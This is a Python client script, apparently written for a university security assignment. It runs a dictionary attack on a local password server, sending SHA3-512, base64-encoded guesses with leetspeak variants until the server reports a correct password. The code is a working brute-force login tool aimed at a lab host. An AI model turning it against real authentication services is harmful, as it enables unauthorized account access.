import os
import socket
import hashlib as hl
import base64
import sys

to_replace = {
    'o': '0',
    'i': '1',
    'r': '2',
    'e': '3',
    'a': '4',
    's': '5',
    'g': '6',
    't': '7',
    'b': '8',
    'p': '9'}

USER = 'ITS202021:'
PORT = 5000
HOST = '127.0.0.1'

# Nice formatting
RED='\033[1;31m'
GRN='\033[1;32m'
YEL='\033[1;33m'
BLU='\033[1;34m'
GRY='\033[1;90m'
NC='\033[0m' # No Color

def chrReplace(word):
    for key in to_replace.keys():
        # Check index with multible hits
        while True:
            if key in word.lower():
                index = word.lower().find(key)
                word = word[:index] + to_replace[key] + word[index + 1:]
            else: break
    return word


def createHash(word):
    return hl.sha3_512(word.encode()).digest()


def toBase64(word):
    return base64.b64encode(word)


def createConnection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        return s;
    except socket.error as e:
        print(RED + 'Error while opening socket.\nErrMsg: %s' % str(e) + NC + '\nSystem exit')
        exit(0)


def sendMsg(conn, word, original='NONE'):
    try:
        msg = toBase64(createHash(word))
        conn.sendall(USER.encode() + msg)
        data = conn.recv(1024)
        # print('Sending: ' + USER + msg.decode())
        # print('recived: ' + data.decode())
        if data == b'02 - Connection refused.' or len(data) == 0:
            print(YEL + 'Refused connection. Restoreing...' + NC)
            conn = createConnection()
        if data == b'01 - Password correct.':
            conn.close()
            if original != 'NONE':
                # Hopefully I did the output format right. Used this template
                #$ htpasswd -nbs myName myPassword
                # myName:{SHA}VBPuJHI7uixaa6LQGWx4s+5GKNE=
                print(GRN + 'Found PW:\n' + NC + original + ': ' + USER + '{SHA}' + msg.decode() )
            else: print(GRN + 'Found PW: ' + word)
            exit(0)
        return conn
    except socket.error as e:
        print(RED + 'Error while sending data.\nErrMsg: %s' % str(e))
        print(YEL + 'Trying to reconnect...' + NC)
        conn = createConnection()
        return conn



if __name__ == "__main__":
    PATH = 'P1/rfc4960.txt'

    # Input argument check
    if(len(sys.argv)!= 2):
        print(YEL + 'Plese specify dictionary!\nUsage python pa1_client.py <Path to dict>' + NC)
        exit(0)
    else: PATH = sys.argv[1]

    # Check if file exists
    if not os.path.isfile(PATH):
        print(RED + 'File does not exist.' + NC)
        exit(0)

    conn = createConnection()
    try:
        with open(PATH, 'r') as reader:
            print('Start dictonary attack...')
            s = reader.readline()
            while s != '':
                for word in s.split():
                    # Send msg with and without replacement
                    conn = sendMsg(conn, chrReplace(word), word)
                    conn = sendMsg(conn, word)

                s = reader.readline()
    except KeyboardInterrupt:
        print("Interrupt received, stopping server...")
        conn.close()
    except UnicodeDecodeError: # Catch all. -> I know not a good practice but should do it for this assignment ¯\_(ツ)_/¯
        print('Unexpected error while reading. Format not supported.')
    print(RED + 'No PW found' + NC)
